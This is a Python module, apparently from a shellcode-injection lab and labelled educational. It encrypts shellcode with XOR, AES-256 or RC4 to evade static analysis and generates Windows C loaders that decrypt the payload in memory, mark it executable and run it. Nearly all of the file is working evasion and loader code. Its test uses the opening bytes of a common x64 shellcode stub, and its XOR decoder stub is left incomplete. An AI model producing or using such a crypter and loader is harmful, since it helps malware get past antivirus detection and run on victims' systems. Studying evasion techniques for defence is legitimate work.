"""
Evasion Technique: Payload Encryption
======================================
Shellcode'u şifreleyerek statik analizi zorlaştırır.

Yöntemler:
1. XOR Encoding - Basit, hızlı
2. AES-256 Encryption - Güçlü
3. RC4 Encryption - Hızlı stream cipher

Author: Ugur Ates
Purpose: Educational
"""

import os
import struct
from typing import Tuple

# ============================================================================
# XOR ENCODING
# ============================================================================

def xor_encode(shellcode: bytes, key: bytes) -> bytes:
    """
    XOR ile shellcode encode et.
    
    Args:
        shellcode: Orijinal shellcode
        key: XOR anahtarı
    
    Returns:
        bytes: Encode edilmiş shellcode
    """
    key_len = len(key)
    encoded = bytearray(len(shellcode))
    
    for i, byte in enumerate(shellcode):
        encoded[i] = byte ^ key[i % key_len]
    
    return bytes(encoded)

def xor_decode(encoded: bytes, key: bytes) -> bytes:
    """XOR decode (aynı işlem)"""
    return xor_encode(encoded, key)  # XOR symmetric

def generate_xor_decoder_stub(key: bytes, shellcode_len: int) -> bytes:
    """
    XOR decoder stub oluştur - shellcode'u runtime'da decode eder.
    
    x64 Assembly:
        lea rsi, [shellcode]
        mov rcx, shellcode_len
        xor_loop:
            xor byte [rsi], key_byte
            inc rsi
            dec rcx
            jnz xor_loop
        jmp shellcode
    """
    # Basitleştirilmiş - gerçek implementasyon daha karmaşık
    # Bu stub, encoded shellcode'u bellekte decode eder
    
    stub = b"\x48\x8D\x35"  # lea rsi, [rip+offset]
    # ... (tamamlanacak)
    
    return stub

# ============================================================================
# AES ENCRYPTION
# ============================================================================

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print("⚠️ pycryptodome yüklü değil. AES encryption kullanılamaz.")
    print("   pip install pycryptodome")

def aes_encrypt(shellcode: bytes, key: bytes = None) -> Tuple[bytes, bytes, bytes]:
    """
    AES-256-CBC ile shellcode şifrele.
    
    Args:
        shellcode: Orijinal shellcode
        key: 32-byte AES anahtarı (None ise random üretilir)
    
    Returns:
        Tuple[encrypted, key, iv]: Şifreli data, anahtar, IV
    """
    if not HAS_CRYPTO:
        raise ImportError("pycryptodome gerekli: pip install pycryptodome")
    
    if key is None:
        key = get_random_bytes(32)  # AES-256
    
    iv = get_random_bytes(16)  # AES block size
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(shellcode, AES.block_size)
    encrypted = cipher.encrypt(padded)
    
    return encrypted, key, iv

def aes_decrypt(encrypted: bytes, key: bytes, iv: bytes) -> bytes:
    """
    AES-256-CBC ile decrypt.
    
    Args:
        encrypted: Şifreli data
        key: AES anahtarı
        iv: Initialization Vector
    
    Returns:
        bytes: Orijinal shellcode
    """
    if not HAS_CRYPTO:
        raise ImportError("pycryptodome gerekli")
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
    
    return decrypted

# ============================================================================
# RC4 ENCRYPTION
# ============================================================================

def rc4_crypt(data: bytes, key: bytes) -> bytes:
    """
    RC4 stream cipher (encrypt = decrypt).
    
    Args:
        data: Input data
        key: RC4 anahtarı
    
    Returns:
        bytes: Encrypted/Decrypted data
    """
    # Key Scheduling Algorithm (KSA)
    S = list(range(256))
    j = 0
    
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # Pseudo-Random Generation Algorithm (PRGA)
    i = j = 0
    output = bytearray(len(data))
    
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        output[k] = data[k] ^ S[(S[i] + S[j]) % 256]
    
    return bytes(output)

# ============================================================================
# SHELLCODE TRANSFORMER
# ============================================================================

def transform_shellcode(shellcode: bytes, method: str = "xor", key: bytes = None) -> dict:
    """
    Shellcode'u seçilen yöntemle dönüştür.
    
    Args:
        shellcode: Orijinal shellcode
        method: "xor", "aes", "rc4"
        key: Encryption key (None = random)
    
    Returns:
        dict: {encrypted, key, iv (if aes), method, original_size}
    """
    result = {
        "method": method,
        "original_size": len(shellcode)
    }
    
    if method == "xor":
        if key is None:
            key = os.urandom(16)
        result["encrypted"] = xor_encode(shellcode, key)
        result["key"] = key
        
    elif method == "aes":
        encrypted, key, iv = aes_encrypt(shellcode, key)
        result["encrypted"] = encrypted
        result["key"] = key
        result["iv"] = iv
        
    elif method == "rc4":
        if key is None:
            key = os.urandom(16)
        result["encrypted"] = rc4_crypt(shellcode, key)
        result["key"] = key
    
    else:
        raise ValueError(f"Bilinmeyen method: {method}")
    
    return result

# ============================================================================
# C CODE GENERATOR
# ============================================================================

def generate_c_loader(encrypted: bytes, key: bytes, method: str = "xor", 
                      iv: bytes = None) -> str:
    """
    Şifreli shellcode için C loader kodu üret.
    
    Args:
        encrypted: Şifreli shellcode
        key: Decryption key
        method: Encryption method
        iv: IV (AES için)
    
    Returns:
        str: C source code
    """
    def bytes_to_c_array(data: bytes, name: str) -> str:
        hex_bytes = ', '.join(f'0x{b:02x}' for b in data)
        return f"unsigned char {name}[] = {{ {hex_bytes} }};"
    
    code = f'''/*
 * Encrypted Shellcode Loader
 * Method: {method.upper()}
 * Generated by Shellcode Injection Lab
 */

#include <windows.h>
#include <stdio.h>

// Encrypted shellcode
{bytes_to_c_array(encrypted, "encrypted_shellcode")}

// Decryption key
{bytes_to_c_array(key, "key")}

'''
    
    if method == "xor":
        code += '''
// XOR Decoder
void xor_decode(unsigned char* data, int len, unsigned char* key, int key_len) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Allocate executable memory
    void* exec = VirtualAlloc(NULL, sizeof(encrypted_shellcode), 
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!exec) {
        printf("VirtualAlloc failed\\n");
        return 1;
    }
    
    // Copy encrypted shellcode
    memcpy(exec, encrypted_shellcode, sizeof(encrypted_shellcode));
    
    // Decode in-place
    xor_decode((unsigned char*)exec, sizeof(encrypted_shellcode), 
               key, sizeof(key));
    
    // Change to executable
    DWORD old;
    VirtualProtect(exec, sizeof(encrypted_shellcode), PAGE_EXECUTE_READ, &old);
    
    // Execute
    ((void(*)())exec)();
    
    return 0;
}
'''
    
    elif method == "rc4":
        code += '''
// RC4 Decryption
void rc4_crypt(unsigned char* data, int len, unsigned char* key, int key_len) {
    unsigned char S[256];
    int i, j = 0;
    
    // KSA
    for (i = 0; i < 256; i++) S[i] = i;
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }
    
    // PRGA
    i = j = 0;
    for (int k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

int main() {
    void* exec = VirtualAlloc(NULL, sizeof(encrypted_shellcode), 
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!exec) return 1;
    
    memcpy(exec, encrypted_shellcode, sizeof(encrypted_shellcode));
    rc4_crypt((unsigned char*)exec, sizeof(encrypted_shellcode), 
              key, sizeof(key));
    
    DWORD old;
    VirtualProtect(exec, sizeof(encrypted_shellcode), PAGE_EXECUTE_READ, &old);
    
    ((void(*)())exec)();
    return 0;
}
'''
    
    return code

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print("="*60)
    print("🔐 Shellcode Encryption Module")
    print("="*60)
    
    # Test shellcode
    test_shellcode = bytes([
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00,
        0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51
    ])
    
    print(f"\n📦 Original: {len(test_shellcode)} bytes")
    print(f"   {' '.join(f'{b:02x}' for b in test_shellcode)}")
    
    # XOR Test
    print("\n🔑 XOR Encryption:")
    key = b"secretkey123"
    encoded = xor_encode(test_shellcode, key)
    print(f"   Encoded: {' '.join(f'{b:02x}' for b in encoded)}")
    
    decoded = xor_decode(encoded, key)
    assert decoded == test_shellcode
    print(f"   ✅ Decode successful")
    
    # RC4 Test
    print("\n🔑 RC4 Encryption:")
    rc4_encrypted = rc4_crypt(test_shellcode, key)
    print(f"   Encrypted: {' '.join(f'{b:02x}' for b in rc4_encrypted)}")
    
    rc4_decrypted = rc4_crypt(rc4_encrypted, key)
    assert rc4_decrypted == test_shellcode
    print(f"   ✅ Decrypt successful")
    
    # AES Test
    if HAS_CRYPTO:
        print("\n🔑 AES-256 Encryption:")
        encrypted, aes_key, iv = aes_encrypt(test_shellcode)
        print(f"   Encrypted: {len(encrypted)} bytes")
        print(f"   Key: {aes_key.hex()[:32]}...")
        
        decrypted = aes_decrypt(encrypted, aes_key, iv)
        assert decrypted == test_shellcode
        print(f"   ✅ Decrypt successful")
    
    # Generate C loader
    print("\n📝 Generating C loader code...")
    result = transform_shellcode(test_shellcode, method="xor")
    c_code = generate_c_loader(result["encrypted"], result["key"], "xor")
    print(f"   Generated {len(c_code)} chars of C code")
    
    print("\n✅ All tests passed!")
